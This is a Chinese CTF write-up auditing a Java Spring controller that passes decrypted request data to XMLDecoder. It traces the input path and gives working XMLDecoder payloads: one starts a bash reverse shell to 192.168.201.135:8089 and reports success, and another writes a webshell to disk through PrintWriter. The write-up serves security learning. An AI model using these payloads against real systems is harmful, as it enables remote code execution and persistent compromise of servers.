某一次玩一个CTF题，由于当时没搞明白，现在重新搞了下终于明白了一点，顺便记录一下审计的思路。参考weblogic XMLDecoder反序列化漏洞 CVE-2017-10271  也是同样的原理。

漏洞的整体源代码：
```java
/*    */ import com.example.happyjavavul.utils.Encryption;
/*    */ import com.example.happyjavavul.utils.FileUtils;
/*    */ import java.beans.XMLDecoder;
/*    */ import java.beans.XMLEncoder;
/*    */ import java.io.BufferedOutputStream;
/*    */ import java.io.File;
/*    */ import java.io.FileNotFoundException;
/*    */ import java.io.FileOutputStream;
/*    */ import java.io.UnsupportedEncodingException;
/*    */ import java.security.InvalidAlgorithmParameterException;
/*    */ import java.security.InvalidKeyException;
/*    */ import java.security.NoSuchAlgorithmException;
/*    */ import javax.crypto.BadPaddingException;
/*    */ import javax.crypto.IllegalBlockSizeException;
/*    */ import javax.crypto.NoSuchPaddingException;
/*    */ import org.springframework.stereotype.Controller;
/*    */ import org.springframework.web.bind.annotation.ResponseBody;
/*    */ 
/*    */ @Controller
/*    */ public class ConfigController
/*    */ {
/*    */   @org.springframework.web.bind.annotation.CrossOrigin
/*    */   @ResponseBody
/*    */   @org.springframework.web.bind.annotation.PostMapping({"api/goldfinger/849d107e"})
/*    */   public Result changeConfig(@org.springframework.web.bind.annotation.RequestBody GameConfig gameConfig)
/*    */   {
/* 29 */     String key = gameConfig.getKey();
/* 30 */     String configData = gameConfig.getDes();
/* 31 */     if ((key.equals("")) || (configData.equals(""))) {
/* 32 */       return new Result(500);
/*    */     }
/*    */     
/* 35 */     if (!java.util.Objects.equals(Encryption.key, key)) {
/* 36 */       return new Result(400);
/*    */     }
/*    */     try
/*    */     {
/* 40 */       xmlData = Encryption.decryptGCMBase64(configData);
/*    */     } catch (NoSuchPaddingException e) { String xmlData;
/* 42 */       e.printStackTrace();
/* 43 */       return new Result(500);
/*    */     } catch (NoSuchAlgorithmException e) {
/* 45 */       e.printStackTrace();
/* 46 */       return new Result(500);
/*    */     } catch (InvalidKeyException e) {
/* 48 */       e.printStackTrace();
/* 49 */       return new Result(500);
/*    */     } catch (BadPaddingException e) {
/* 51 */       e.printStackTrace();
/* 52 */       return new Result(500);
/*    */     } catch (IllegalBlockSizeException e) {
/* 54 */       e.printStackTrace();
/* 55 */       return new Result(500);
/*    */     } catch (InvalidAlgorithmParameterException e) {
/* 57 */       e.printStackTrace();
/* 58 */       return new Result(500);
/*    */     } catch (UnsupportedEncodingException e) {
/* 60 */       e.printStackTrace();
/* 61 */       return new Result(500);
/*    */     }
/*    */     try {
/*    */       String xmlData;
/* 65 */       java.io.InputStream stream = new java.io.ByteArrayInputStream(xmlData.getBytes());
/* 66 */       XMLDecoder decoder = new XMLDecoder(stream);
/* 67 */       rawGameConfig = (RawGameConfig)decoder.readObject();
/*    */     } catch (Exception e) { RawGameConfig rawGameConfig;
/* 69 */       e.printStackTrace();
/* 70 */       return new Result(500); }
/*    */     RawGameConfig rawGameConfig;
/* 72 */     File file = new File(FileUtils.getCurrentDirectory(), "currentRawGameConfig.xml");
/* 73 */     BufferedOutputStream bufferedOutputStream = null;
/*    */     try {
/* 75 */       bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(file, false));
/*    */     } catch (FileNotFoundException e) {
/* 77 */       e.printStackTrace();
/*    */     }
/* 79 */     XMLEncoder xmlEncoder = new XMLEncoder(bufferedOutputStream);
/* 80 */     xmlEncoder.writeObject(rawGameConfig);
/* 81 */     xmlEncoder.close();
/* 82 */     return new Result(200);
/*    */   }
/*    */ }

```


来到ConfigController.java中<br />路由api/goldfinger/849d107e ，通过body获取gameConfig的内容，分别是getKey、getDes两个值<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644336160440-85a46013-b2f8-43ce-bc7e-ac8d8f1b2bf8.png#clientId=u66bddfec-ec48-4&from=paste&height=120&id=u074fc7b5&originHeight=232&originWidth=1099&originalType=binary&ratio=1&size=28252&status=done&style=none&taskId=uae4cf448-03dd-4eb0-8a1e-65ffd083027&width=568.6000366210938)<br />跟进查看GameConfig类，其实就是key和des的值。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644336231611-aedd8f5c-5c41-4b82-b4c0-4a957d092d65.png#clientId=u66bddfec-ec48-4&from=paste&height=404&id=uecddd3ad&originHeight=668&originWidth=743&originalType=binary&ratio=1&size=47051&status=done&style=none&taskId=uc64a00b8-1115-4563-a373-652142f831c&width=449.5)

继续往下查看ConfigController.java代码逻辑，如果key、configData值不为空，那么继续往下比对key中的值<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644336361802-a7de0139-6daf-4725-b2da-017fdb03423c.png#clientId=u66bddfec-ec48-4&from=paste&height=144&id=u3e4ddbfd&originHeight=184&originWidth=694&originalType=binary&ratio=1&size=16575&status=done&style=none&taskId=ufebe77ba-f307-43cc-a1f1-bdf4f72950b&width=542)<br />跟进一下Encryption.java查看key值，也就前端输入的key要和这个key相等，才能继续进入下一个逻辑<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644336427605-c0c7f429-8c6e-4939-af9b-8ee82ae51dfd.png#clientId=u66bddfec-ec48-4&from=paste&height=392&id=uf230fa79&originHeight=496&originWidth=646&originalType=binary&ratio=1&size=51089&status=done&style=none&taskId=uf1662af2-0893-491b-9efc-3678391d77c&width=511)

configData的值会进行一个GCMBase64方法的解密<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644336492186-974df0a2-7ab5-48e2-8a1a-70a0b1a4887d.png#clientId=u66bddfec-ec48-4&from=paste&height=397&id=u2f2298c3&originHeight=602&originWidth=787&originalType=binary&ratio=1&size=58415&status=done&style=none&taskId=u2d9118cc-7b24-4d21-9336-c656ed0b866&width=518.5)

解密的值会转化为xml格式后再进行一次反序列化readObject()<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644336569027-f746a390-998f-42af-a660-e16a337d67b9.png#clientId=u66bddfec-ec48-4&from=paste&height=108&id=uc8251e36&originHeight=187&originWidth=958&originalType=binary&ratio=1&size=21450&status=done&style=none&taskId=udfe8831c-80b9-4cb5-841e-aa7e6eb3619&width=553)

梳理思路：key和des值都是可控，key值在逻辑传输中并其他变化，而des值的关系主要如下：<br />des→configData(GCM+BASE64的解密)→xmlData→readObject<br />XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象

集齐以上因素，攻击者只要对des参数传参时，构造xml的攻击payload+(GCM+BASE64加密)即可进行反序列化攻击
```java
<void class="java.lang.ProcessBuilder">
    <array class="java.lang.String" length="3">
        <void index="0">
            <string>/bin/bash</string>
        </void>
        <void index="1">
            <string>-c</string>
        </void>
        <void index="2">
            <string>bash -i &gt;&amp; /dev/tcp/192.168.201.135/8089 0&gt;&amp;1</string>
        </void>
    </array>
    <void method="start"/>
</void>
```
把加密后的xml填入到 GameConfig  中，成功反弹shell。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1644592773269-366de4ff-889d-4081-b190-6d6947cb3939.png#clientId=u5a001ede-41df-4&from=paste&height=620&id=u2fe38828&originHeight=827&originWidth=1653&originalType=binary&ratio=1&size=351355&status=done&style=none&taskId=u20e6e4a3-1018-4fe9-a210-248ae630f94&width=1240)

如果目标不出网，可以通过调用io流写入webshell，但前提是找到物理路径才行。
```java
<java version="1.8.0_131" class="java.beans.xmlDecoder">
    <object class="java.io.PrintWriter">
        <string>物理路径</string>
        <void method="println">
            <string>
                123木马内容
            </string>
        </void>
        <void method="close" />
    </object>
</java>
```


